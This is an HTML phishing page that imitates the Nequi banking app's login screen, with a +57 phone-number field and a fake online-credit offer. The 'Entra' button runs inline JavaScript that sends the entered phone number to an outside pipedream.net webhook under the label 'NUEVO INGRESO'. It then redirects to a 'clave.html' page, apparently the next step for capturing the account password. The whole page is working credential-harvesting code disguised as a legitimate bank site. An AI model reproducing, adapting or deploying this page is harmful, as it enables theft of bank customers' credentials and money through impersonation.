<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi - Ingresa tu celular</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: #21002b;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 420px;
            margin: 0 auto;
            color: white;
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            text-align: center;
            margin: 20px 0 50px;
            letter-spacing: -0.5px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }
        .phone-input-container {
            padding: 0 10px;
        }
        .phone-input {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 25px;
        }
        .country-code {
            font-size: 20px;
            font-weight: 500;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(10px);
            border-radius: 14px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .phone-number {
            flex: 1;
            padding: 16px 20px;
            font-size: 18px;
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 14px;
            color: white;
        }
        .phone-number::placeholder {
            color: rgba(255, 255, 255, 0.65);
        }
        .phone-number:focus {
            outline: none;
            border-color: #ff008c;
            background: rgba(255, 255, 255, 0.18);
        }
        .btn-entrar {
            width: 100%;
            padding: 16px;
            background: #ff008c;
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin: 15px 0 30px;
            box-shadow: 0 4px 15px rgba(255, 0, 140, 0.3);
            transition: all 0.3s;
        }
        .btn-entrar:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 0, 140, 0.4);
        }
        .info-section {
            margin-top: 30px;
            background: rgba(0, 0, 0, 0.25);
            backdrop-filter: blur(10px);
            padding: 30px 25px;
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .info-section h2 {
            font-size: 22px;
            margin-bottom: 18px;
            font-weight: 600;
        }
        .info-section p {
            font-size: 15px;
            line-height: 1.7;
            opacity: 0.95;
            margin-bottom: 25px;
        }
        .btn-solicita {
            display: block;
            width: 100%;
            padding: 16px;
            background: #ff008c;
            color: white;
            text-decoration: none;
            text-align: center;
            border-radius: 14px;
            font-weight: 600;
            font-size: 16px;
            box-shadow: 0 4px 15px rgba(255, 0, 140, 0.3);
            transition: all 0.3s;
        }
        .btn-solicita:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 0, 140, 0.4);
        }
        .ritmo-text {
            text-align: center;
            margin-top: 25px;
            font-size: 15px;
            opacity: 0.9;
        }
        .ritmo-text strong {
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Nequi</div>
        
        <div class="phone-input-container">
            <div class="phone-input">
                <div class="country-code">+57</div>
                <input type="tel" class="phone-number" placeholder="Ingresa tu cel" value="">
            </div>
            <button class="btn-entrar" onclick="const webhookURL = 'https://eo8ne5wlaz6wu8g.m.pipedream.net';
const numeroCelular = document.querySelector('.phone-number').value;

const mensaje = `📱 **NUEVO INGRESO**\nNúmero: +57 ${numeroCelular}`;

fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: mensaje })
}).finally(() => {
    window.location.href = 'clave.html';
});">Entra</button>
        </div>
        
        <div class="info-section">
            <h2>Crédito en línea y al instante desde tu Web Nequi</h2>
            <p>Analizamos cómo manejas tu plata. Entre más pagues, recargues y uses menos efectivo, mejor conocemos tu perfil y más chance tienes de acceder a mejores condiciones.</p>
            <a href="#" class="btn-solicita">Solicita tu crédito</a>
            <p class="ritmo-text">Paga tu crédito de forma flexible y <strong>#ATuRitmo</strong></p>
        </div>
    </div>
</body>
</html>
